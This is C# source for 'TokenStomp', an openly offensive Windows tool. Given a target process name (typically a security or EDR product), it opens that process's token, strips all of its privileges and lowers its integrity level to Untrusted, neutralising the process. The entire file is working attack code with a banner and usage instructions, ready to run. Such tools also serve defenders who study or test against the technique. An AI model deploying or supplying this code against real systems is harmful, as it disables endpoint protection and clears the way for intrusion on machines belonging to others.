using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TokenStomp
{
    public class Program
    {

        [Flags()]
        enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(
            ProcessAccessFlags dwDesiredAccess,
            [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            int dwProcessId
        );

        [Flags()]
        enum TokenAccessFlags : int
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID)
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            TokenAccessFlags DesiredAccess,
            out IntPtr TokenHandle
        );

        struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
           [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
           ref TOKEN_PRIVILEGES NewState,
           int Zero,
           IntPtr Null1,
           IntPtr Null2);

        [StructLayout(LayoutKind.Sequential)]
        private struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [Flags()]
        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern Boolean SetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            UInt32 TokenInformationLength);

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ConvertStringSidToSid(
            string StringSid,
            out IntPtr ptrSid
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength
        );


        public static void Main(string[] args)
        {
            string ascii = @"
  ________           ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄   ▄ ▄▄▄▄▄▄▄ ▄▄    ▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄
 (____ / <|         █       █       █   █ █ █       █  █  █ █       █       █       █  █▄█  █       █
 (___ /  <|         █▄     ▄█   ▄   █   █▄█ █    ▄▄▄█   █▄█ █  ▄▄▄▄▄█▄     ▄█   ▄   █   █   █    ▄  █
 (__ /   <`-------.   █   █ █  █ █  █      ▄█   █▄▄▄█       █ █▄▄▄▄▄  █   █ █  █ █  █       █   █▄█ █
 /  `.    ^^^^^ |  \  █   █ █  █▄█  █     █▄█    ▄▄▄█  ▄    █▄▄▄▄▄  █ █   █ █  █▄█  █  ▄ ▄  █    ▄▄▄█
|     \---------'   | █   █ █       █    ▄  █   █▄▄▄█ █ █   █▄▄▄▄▄█ █ █   █ █       █ ██▄██ █   █ 
|______|___________/] █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█ █▄█▄▄▄▄▄▄▄█▄█  █▄▄█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄█▄█   █▄█▄▄▄█ 
[▄▄▄▄▄|`-.▄▄▄▄▄▄▄▄▄]               Implemented by @Mrtn9 - Technique by @GabrielLandau
";

            Console.WriteLine(ascii);

            if (args.Length == 0)
            {
                Console.WriteLine("Usage: TokenStomp.exe <ProcessName>");
                Environment.Exit(0);
            }
            string processName = args[0];

            Process[] processes = Process.GetProcessesByName(processName);

            if (processes.Length != 1)
            {
                Console.WriteLine("[!] Found {0} instances of {1}, quitting", processes.Length, processName);
                return;
            }

            Process currentProcess = processes[0];
            bool result;

            Console.WriteLine("[*] Found {0} with pid {1}", currentProcess.ProcessName, currentProcess.Id);
            int pid = currentProcess.Id;

            IntPtr handle = OpenProcess(ProcessAccessFlags.QueryLimitedInformation, false, pid);

            Console.WriteLine("[*] Got handle to process");

            IntPtr currentToken;
            result = OpenProcessToken(handle, TokenAccessFlags.TOKEN_ALL_ACCESS, out currentToken);
            if (result)
            {
                Console.WriteLine("[*] Successfully opened process token");
            }
            else
            {
                Console.WriteLine("[!] Failed to open process token");
                return;
            }
            // first call gets lenght of TokenInformation
            int TokenInfLength;
            GetTokenInformation(currentToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);

            // second call gets token information
            result = GetTokenInformation(currentToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out _);

            if (result)
            {
                Console.WriteLine("[*] Got token information");
                TOKEN_PRIVILEGES TokenPrivs = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_PRIVILEGES));

                int privCount = TokenPrivs.PrivilegeCount;

                Console.WriteLine("[*] Found {0} privileges in token", privCount);

                int removedCount = 0;

                // This part is ugly, but I am to tired to fix it
                const int sizeDword = 4;
                var pSaa = TokenInformation + sizeDword;
                for (int i = 0; i < privCount; i++)
                {
                    var laa = (LUID_AND_ATTRIBUTES)Marshal.PtrToStructure((IntPtr)pSaa, typeof(LUID_AND_ATTRIBUTES));

                    var tkp = new TOKEN_PRIVILEGES
                    {
                        PrivilegeCount = 1,
                        Privileges = new LUID_AND_ATTRIBUTES[1]
                    };
                    tkp.Privileges[0].Luid = laa.Luid;
                    tkp.Privileges[0].Attributes = 0x00000004; // SE_PRIVILEGE_REMOVED


                    result = AdjustTokenPrivileges(currentToken, false, ref tkp, 0, IntPtr.Zero, IntPtr.Zero);
                    if (result)
                    {
                        removedCount += 1;
                    }

                    pSaa += Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES));
                }

                Console.WriteLine("[*] Successfully removed {0} of {1} privileges from token", removedCount, privCount);

            }

            Marshal.FreeHGlobal(TokenInformation);

            TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            tml.Label.Attributes = 0x20; // SE_GROUP_INTEGRITY
            tml.Label.Sid = IntPtr.Zero;
            string ML_UNTRUSTED = "S-1-16-0"; // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
            ConvertStringSidToSid(ML_UNTRUSTED, out tml.Label.Sid);

            IntPtr tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
            Marshal.StructureToPtr(tml, tmlPtr, false);

            result = SetTokenInformation(currentToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, tmlPtr, (uint)Marshal.SizeOf(tml));

            if (result)
            {
                Console.WriteLine("[*] Successfully set token untrusted");
            }
            else
            {
                Console.WriteLine("[!] Could not set token to untrusted");
            }
        }
    }
}
